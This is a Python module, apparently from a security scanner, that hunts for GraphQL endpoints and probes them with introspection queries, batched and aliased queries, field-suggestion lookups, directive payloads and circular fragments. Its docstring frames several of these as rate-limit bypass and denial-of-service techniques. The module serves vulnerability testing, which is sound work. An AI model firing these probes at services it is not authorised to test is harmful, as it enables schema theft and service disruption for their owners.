"""
GraphQL Abuser: Advanced GraphQL vulnerability detection and exploitation.

Attack Techniques:
  1. Introspection abuse (schema discovery)
  2. Batch query attacks (rate limit bypass)
  3. Field suggestion abuse (info disclosure)
  4. Depth limit bypass (DoS)
  5. Circular fragment abuse (DoS)
  6. Directive injection
  7. Alias-based batching
  8. Schema leaking via error messages
  9. Subscription hijacking
"""
import json
import re
import time
from typing import Dict, List
from urllib.parse import urljoin

from tools.http_client import HttpClient
from tools.log_utils import get_logger

logger = get_logger("graphql_abuser")


INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

INTROSPECTION_MINIMAL = "{ __schema { types { name kind fields { name type { name } } } } }"

FIELD_SUGGESTION_QUERY = """
query {
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}

query {
  __type(name: "Admin") {
    fields {
      name
      type { name }
    }
  }
}

query {
  __type(name: "Query") {
    fields {
      name
      description
      args {
        name
        type { name }
      }
    }
  }
}

query {
  __type(name: "Mutation") {
    fields {
      name
      description
      args {
        name
        type { name }
      }
    }
  }
}
"""

DEPTH_PAYLOADS = [
    "query { __typename ...{A} } fragment A on __Schema { types { fields { type { ofType { name } } } } }",
    "query { a1: __typename ...{a2} } fragment a2 on __Schema { types { name ...{a3} } } fragment a3 on __Type { fields { type { name } } }",
]

BATCH_QUERY = """
query {
  u1: __typename
  u2: __typename
  u3: __typename
  u4: __typename
  u5: __typename
}
"""

CIRCULAR_FRAGMENTS = """
query CircularA {
  ...CircularB
}
fragment CircularB on Query {
  ...CircularA
}
"""

DIRECTIVE_PAYLOADS = [
    'query @skip(if: false) { __typename }',
    'query @include(if: true) { __typename }',
    'mutation @deprecated { __typename }',
]


class GraphQLAbuser:
    """
    Advanced GraphQL vulnerability detection and exploitation.

    Usage:
        abuser = GraphQLAbuser(sess, timeout)
        result = abuser.check(url)
    """

    def __init__(self, sess: 'requests.Session' = None, timeout: float = 10.0):
        self.sess = sess or HttpClient()
        self.timeout = timeout
        self._schema = None
        self._endpoints = []

    def _find_endpoint(self, base_url: str) -> List[str]:
        candidates = [
            "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
            "/v2/graphql", "/gql", "/query", "/api/query", "/graphql/console",
            "/altair", "/playground", "/_graphql",
        ]
        found = []
        for path in candidates:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            try:
                resp = self.sess.post(url, json={"query": "{__typename}"},
                                      timeout=self.timeout, verify=False,
                                      headers={"Content-Type": "application/json"})
                if resp.status_code in (200, 400, 422) and (
                    "data" in resp.text or "errors" in resp.text or "message" in resp.text
                ):
                    found.append(url)
            except Exception:
                pass
        return found

    def _make_query(self, endpoint: str, query: str,
                    variables: Dict = None, operation_name: str = None) -> Dict:
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        if operation_name:
            payload["operationName"] = operation_name
        try:
            resp = self.sess.post(endpoint, json=payload,
                                  timeout=self.timeout, verify=False,
                                  headers={"Content-Type": "application/json"})
            return {
                "status_code": resp.status_code,
                "body": resp.text,
                "json": resp.json() if resp.headers.get("content-type", "").startswith("application/json") else None,
                "elapsed": resp.elapsed.total_seconds() if hasattr(resp, 'elapsed') else 0,
            }
        except Exception as e:
            logger.debug("GraphQL request failed: %s", e)
            return {"status_code": 0, "body": "", "json": None, "elapsed": 0, "error": str(e)}

    def check(self, url: str, **kwargs) -> Dict:
        findings = []
        endpoints = self._find_endpoint(url)

        if not endpoints:
            endpoints = [url.rstrip("/") + "/graphql"]

        for endpoint in endpoints:
            findings.extend(self._check_introspection(endpoint))
            findings.extend(self._check_field_suggestions(endpoint))
            findings.extend(self._check_batch_queries(endpoint))
            findings.extend(self._check_depth_abuse(endpoint))
            findings.extend(self._check_directive_injection(endpoint))
            findings.extend(self._check_circular_fragments(endpoint))

        confirmed = [f for f in findings if f.get("confirmed")]
        return {
            "vulnerable": len(confirmed) > 0,
            "vuln_type": "graphql_abuse",
            "confidence": max([f.get("confidence", 0) for f in findings], default=0),
            "findings": findings,
            "endpoints_found": endpoints,
            "schema_extracted": self._schema is not None,
        }

    def _check_introspection(self, endpoint: str) -> List[Dict]:
        findings = []

        # Full introspection
        result = self._make_query(endpoint, INTROSPECTION_QUERY)
        if result.get("json") and "data" in result["json"]:
            data = result["json"]["data"]
            if data.get("__schema"):
                types = data["__schema"].get("types", [])
                custom_types = [t for t in types if not t["name"].startswith("__")]
                findings.append({
                    "method": "full_introspection",
                    "confidence": 0.90,
                    "confirmed": True,
                    "types_found": len(custom_types),
                    "type_names": [t["name"] for t in custom_types[:20]],
                    "query_type": data["__schema"].get("queryType", {}).get("name"),
                    "mutation_type": data["__schema"].get("mutationType", {}).get("name"),
                })
                self._schema = data["__schema"]

        # Minimal introspection
        result2 = self._make_query(endpoint, INTROSPECTION_MINIMAL)
        if result2.get("json") and "data" in result2["json"]:
            data = result2["json"]["data"]
            if data.get("__schema"):
                findings.append({
                    "method": "minimal_introspection",
                    "confidence": 0.85,
                    "confirmed": True,
                })

        # Introspection via GET
        try:
            resp = self.sess.get(endpoint, params={"query": INTROSPECTION_MINIMAL},
                                 timeout=self.timeout, verify=False)
            if resp.status_code == 200 and "__schema" in resp.text:
                findings.append({
                    "method": "introspection_via_get",
                    "confidence": 0.80,
                    "confirmed": True,
                })
        except Exception:
            pass

        return findings

    def _check_field_suggestions(self, endpoint: str) -> List[Dict]:
        findings = []

        for query in FIELD_SUGGESTION_QUERY.strip().split("\n\n"):
            query = query.strip()
            if not query:
                continue
            result = self._make_query(endpoint, query)
            if result.get("json"):
                errors = result["json"].get("errors", [])
                for error in errors:
                    msg = error.get("message", "")
                    if "did you mean" in msg.lower() or "suggestion" in msg.lower():
                        suggestions = re.findall(r'"([^"]+)"', msg)
                        findings.append({
                            "method": "field_suggestion_abuse",
                            "confidence": 0.70,
                            "confirmed": True,
                            "suggestions": suggestions,
                            "error_message": msg[:200],
                        })
                    elif any(kw in msg.lower() for kw in ["cannot query", "unknown field", "unknown argument"]):
                        schema_leak = re.findall(r'\"([A-Z][a-zA-Z]+)\"', msg)
                        if schema_leak:
                            findings.append({
                                "method": "error_schema_leak",
                                "confidence": 0.60,
                                "confirmed": True,
                                "leaked_types": list(set(schema_leak)),
                                "error_message": msg[:200],
                            })

        return findings

    def _check_batch_queries(self, endpoint: str) -> List[Dict]:
        findings = []

        # Single query timing
        start = time.time()
        self._make_query(endpoint, "{ __typename }")
        single_time = time.time() - start

        # Batch query timing
        batch_payload = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
        ]
        try:
            start = time.time()
            resp = self.sess.post(endpoint, json=batch_payload,
                                  timeout=self.timeout, verify=False,
                                  headers={"Content-Type": "application/json"})
            batch_time = time.time() - start
            if resp.status_code == 200:
                try:
                    batch_results = resp.json()
                    if isinstance(batch_results, list) and len(batch_results) == 5:
                        findings.append({
                            "method": "batch_query",
                            "confidence": 0.75,
                            "confirmed": True,
                            "batch_size": 5,
                            "single_time": single_time,
                            "batch_time": batch_time,
                            "speedup": round(single_time / max(batch_time, 0.001), 1),
                        })
                except json.JSONDecodeError:
                    pass
        except Exception:
            pass

        # Alias-based batching
        alias_query = """
        query {
          q1: __typename
          q2: __typename
          q3: __typename
          q4: __typename
          q5: __typename
        }
        """
        result = self._make_query(endpoint, alias_query)
        if result.get("json") and "data" in result["json"]:
            data = result["json"]["data"]
            if all(data.get("q%d" % i) == "__Schema" or data.get("q%d" % i) for i in range(1, 6)):
                findings.append({
                    "method": "alias_batching",
                    "confidence": 0.70,
                    "confirmed": True,
                })

        return findings

    def _check_depth_abuse(self, endpoint: str) -> List[Dict]:
        findings = []

        # Depth limit test
        depth_query = "query { " + " ".join(["a%d: __typename" % i for i in range(50)]) + " }"
        result = self._make_query(endpoint, depth_query)
        if result.get("json"):
            if "data" in result["json"] and not result["json"].get("errors"):
                findings.append({
                    "method": "no_depth_limit",
                    "confidence": 0.65,
                    "confirmed": True,
                    "max_depth_tested": 50,
                })
            elif result["json"].get("errors"):
                err_msg = result["json"]["errors"][0].get("message", "")
                if "depth" in err_msg.lower() or "limit" in err_msg.lower():
                    depth_match = re.search(r'(\d+)', err_msg)
                    max_depth = int(depth_match.group(1)) if depth_match else 0
                    findings.append({
                        "method": "depth_limit_detected",
                        "confidence": 0.50,
                        "confirmed": False,
                        "max_depth": max_depth,
                        "error": err_msg[:200],
                    })

        return findings

    def _check_directive_injection(self, endpoint: str) -> List[Dict]:
        findings = []

        for payload in DIRECTIVE_PAYLOADS:
            result = self._make_query(endpoint, payload)
            if result.get("json") and "data" in result["json"]:
                if result["json"]["data"].get("__typename"):
                    findings.append({
                        "method": "directive_injection",
                        "confidence": 0.55,
                        "confirmed": True,
                        "payload": payload,
                    })
                    break

        return findings

    def _check_circular_fragments(self, endpoint: str) -> List[Dict]:
        findings = []

        result = self._make_query(endpoint, CIRCULAR_FRAGMENTS)
        if result.get("json"):
            errors = result["json"].get("errors", [])
            for error in errors:
                msg = error.get("message", "")
                if "circular" in msg.lower() or "recursive" in msg.lower():
                    findings.append({
                        "method": "circular_fragment_detected",
                        "confidence": 0.40,
                        "confirmed": False,
                        "error": msg[:200],
                    })
                elif "max" in msg.lower() or "limit" in msg.lower() or "depth" in msg.lower():
                    findings.append({
                        "method": "fragment_depth_limit",
                        "confidence": 0.45,
                        "confirmed": False,
                        "error": msg[:200],
                    })

        return findings


def check(url: str, param: str = None, sess=None, timeout: float = 10.0, **kwargs) -> Dict:
    abuser = GraphQLAbuser(sess, timeout)
    return abuser.check(url, **kwargs)
